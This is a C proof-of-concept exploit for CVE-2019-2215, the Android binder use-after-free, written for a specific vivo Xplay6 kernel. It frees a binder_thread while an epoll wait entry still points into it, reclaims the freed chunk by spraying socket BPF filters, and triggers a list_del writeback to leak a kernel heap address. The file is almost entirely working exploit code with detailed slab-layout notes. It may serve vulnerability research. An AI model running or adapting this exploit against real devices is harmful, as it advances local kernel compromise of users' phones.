/*
 * CVE-2019-2215 PoC - vivo Xplay6 PD1610 8.19.16 (3.18.71-perf-g8a8c60dd)
 *
 * UAF: binder_thread (kmalloc(0x190) -> kmalloc-512) freed via BINDER_THREAD_EXIT
 *      while an epoll registration still holds pwq->whead = &thread->wait (+0x98).
 *      binder_thread_release does no wait-queue cleanup (RE-confirmed).
 *
 * Reclaim primitive (SELinux-free, add_key is denied for shell on 8.1):
 *   setsockopt(SO_ATTACH_FILTER) classic BPF, 62 insns (496B).
 *   3.18 __get_filter path: bpf_prog_alloc(0x218=536B -> kmalloc-1024) FIRST,
 *   then bpf_prog_store_orig_filter kmemdup(496B) -> kmalloc-512 = first 512
 *   alloc after the free -> lands on the freed binder chunk.
 *   getsockopt(SO_GET_FILTER) reads the original insns back from orig_prog.
 *
 * Leak: close(epfd) -> remove_wait_queue(chunk+0x98, pwq) -> list_del writes
 *   (chunk+0xA0) into chunk+0xA0 (task_list.next, insn20) and chunk+0xA8
 *   (task_list.prev, insn21). Read back -> kernel heap leak.
 *
 * Lock-word note: wait.lock @chunk+0x98 = insn19 bytes[0..3] must be an
 *   UNLOCKED arm64 ticket spinlock (owner==next). All-zero insn (LD W IMM k=0)
 *   gives lock=0 -> owner=next=0 -> instant acquire.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

#define BINDER_THREAD_EXIT 0x40046208  /* _IOW('b', 8, int)   */
#define BINDER_VERSION     0xc0046209  /* _IOWR('b', 9, int)  */

#ifndef SO_ATTACH_FILTER
#define SO_ATTACH_FILTER 1
#endif
#ifndef SO_GET_FILTER
#define SO_GET_FILTER 77
#endif
#ifndef __NR_sched_setaffinity
#define __NR_sched_setaffinity 122
#endif

/* kernel struct sock_filter: { u16 code; u8 jt; u8 jf; u32 k; } = 8B */
struct sf { unsigned short code; unsigned char jt, jf; unsigned int k; };
/* kernel struct sock_fprog: { u16 len; struct sock_filter *filter; } = 16B */
struct sfp { unsigned short len; struct sf *f; };

#define NINSNS         62   /* 62 * 8 = 496B -> kmalloc-512 exact            */
#define LOCK_INSN      19   /* chunk+0x98: wait.lock  (spinlock, 4B)         */
#define NEXT_INSN      20   /* chunk+0xA0: task_list.next (kernel ptr)       */
#define PREV_INSN      21   /* chunk+0xA8: task_list.prev (kernel ptr)       */
#define TASKLIST_NEXT  0xA0
#define NSOCK          40

static void dump_hex(const char *tag, const unsigned char *p, int off, int len)
{
    printf("%s @0x%03x:\n", tag, off);
    for (int i = 0; i < len; i += 16) {
        printf("  %03x: ", off + i);
        for (int j = 0; j < 16 && i + j < len; j++)
            printf("%02x ", p[i + j]);
        printf("\n");
    }
}

static void pin_cpu0(void)
{
    unsigned long long mask = 1;
    syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
}

int main(void)
{
    int fd, epfd, ret;
    int ver = 0;
    int socks[NSOCK];
    int nsock = 0;
    static struct sf insns[NINSNS];
    struct sfp prog;
    unsigned char back[NINSNS * 8];

    pin_cpu0();

    fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) { perror("open /dev/binder"); return 1; }

    ret = ioctl(fd, BINDER_VERSION, &ver);
    printf("binder version ioctl ret=%d ver=%d (creates binder_thread for tid %d)\n",
           ret, ver, (int)syscall(__NR_gettid));

    /* register binder fd in epoll -> binder_poll -> poll_wait(&thread->wait)
       -> pwq linked into thread->wait.task_list                       */
    epfd = epoll_create1(0);
    if (epfd < 0) { perror("epoll_create1"); return 1; }
    struct epoll_event ev = { .events = EPOLLIN, .data.fd = fd };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev) < 0) { perror("epoll_ctl ADD"); return 1; }
    printf("epoll ADD ok: pwq now linked into thread->wait (chunk+0x98)\n");

    /* pre-create ALL sockets BEFORE the free: AF_UNIX sock struct itself is a
       512-class alloc, and it must not race us for the freed chunk.  After
       BINDER_THREAD_EXIT the very first kmalloc-512 must be the kmemdup(496)
       inside setsockopt (prog alloc is __vmalloc, aux=80B, orig=16B).       */
    for (int i = 0; i < NSOCK; i++) {
        int s = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (s < 0) { perror("socket"); break; }
        socks[nsock++] = s;
    }
    if (nsock < NSOCK) { printf("only %d sockets\n", nsock); return 1; }
    printf("pre-created %d unix dgram sockets\n", nsock);

    /* free binder_thread (kmalloc-512) -- pwq->whead dangles at chunk+0x98 */
    if (ioctl(fd, BINDER_THREAD_EXIT, 0) < 0) { perror("BINDER_THREAD_EXIT"); return 1; }
    printf("BINDER_THREAD_EXIT ok: chunk freed, pwq dangling\n");

    /* build filter: 62 x RET|K (valid classic BPF); insn19 all-zero so the
       wait.lock word is an unlocked ticket spinlock (owner==next==0)       */
    for (int i = 0; i < NINSNS; i++) {
        insns[i].code = 0x0006;   /* BPF_RET | BPF_K */
        insns[i].jt = 0; insns[i].jf = 0;
        insns[i].k = 0x22150622;  /* marker */
    }
    memset(&insns[LOCK_INSN], 0, sizeof(struct sf));
    prog.len = NINSNS;
    prog.f = insns;

    for (int i = 0; i < nsock; i++) {
        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                       &prog, sizeof(prog)) < 0) {
            perror("setsockopt SO_ATTACH_FILTER");
            break;
        }
    }
    printf("sprayed %d BPF filter payloads (496B -> kmalloc-512)\n", nsock);

    /* trigger the writeback: close(epfd) -> remove_wait_queue(chunk+0x98, pwq).
       pwq->task_list.next/prev both == chunk+0xA0 (single-entry list), so
       list_del writes chunk+0xA0 back into chunk+0xA0 and chunk+0xA8.        */
    close(epfd);
    printf("close(epfd) done: writeback should have landed at chunk+0xA0/0xA8\n");

    /* scan: the socket whose orig filter chunk == freed binder chunk now has
       kernel pointers at insn20/insn21; every other socket is all-markers    */
    int hit = -1;
    for (int i = 0; i < nsock; i++) {
        socklen_t blen = sizeof(back);
        if (getsockopt(socks[i], SOL_SOCKET, SO_GET_FILTER, back, &blen) < 0) {
            perror("getsockopt SO_GET_FILTER");
            continue;
        }
        if (blen < (TASKLIST_NEXT / 8 + 2) * 8) continue;
        unsigned long long v;
        memcpy(&v, back + (TASKLIST_NEXT / 8) * 8, 8);  /* insn20 @ chunk+0xA0 */
        if ((v >> 48) != 0xffffULL) continue;           /* not a kernel pointer */
        printf("sock idx %d: readback @chunk+0xA0 = 0x%016llx\n", i, v);
        if ((v & 0x1ff) == TASKLIST_NEXT) {             /* kmalloc-512 alignment */
            unsigned long long chunk = v - TASKLIST_NEXT;
            hit = i;
            dump_hex("after close(ep)", back, 0x98 - 8, 0x20);
            printf("\n[+] KERNEL HEAP LEAK: binder_thread chunk @ 0x%016llx\n", chunk);
            printf("[+] UAF chain CONFIRMED (free -> reclaim -> writeback -> leak)\n");
            break;
        }
    }
    if (hit < 0)
        printf("\n[-] spray missed or writeback not observed -- retry run\n");

    /* cleanup: closing sockets frees the filter chunks (RCU-delayed) */
    for (int i = 0; i < nsock; i++) close(socks[i]);
    close(fd);
    return 0;
}
